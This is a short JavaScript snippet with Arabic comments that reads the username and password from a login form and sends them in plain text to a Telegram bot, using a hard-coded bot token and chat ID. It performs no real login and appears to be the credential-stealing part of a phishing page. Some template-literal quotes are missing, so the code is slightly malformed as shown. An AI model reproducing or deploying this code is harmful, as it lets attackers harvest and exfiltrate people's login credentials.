document.getElementById('loginButton').addEventListener('click', function (e) {
  e.preventDefault(); // لمنع الإجراء الافتراضي (إعادة تحميل الصفحة)

  // التقاط البيانات من النموذج
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // إنشاء الرسالة لإرسالها عبر البوت
  const message = New login attempt:\nUsername: ${username}\nPassword: ${password};

  // رابط API البوت الخاص بك مع chat_id الخاص بك
  const botToken = '7404046910:AAEXGNnbZoh2NiXZLDnrOoaucDiqaGTYfCc';
  const chatId = '7643313499';
  const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

  // إرسال البيانات عبر الـ Fetch API
  fetch(url)
    .then(response => response.json())
    .then(data => {
      console.log('Message sent successfully:', data);
    })
    .catch(error => {
      console.error('Error sending message:', error);
    });
});
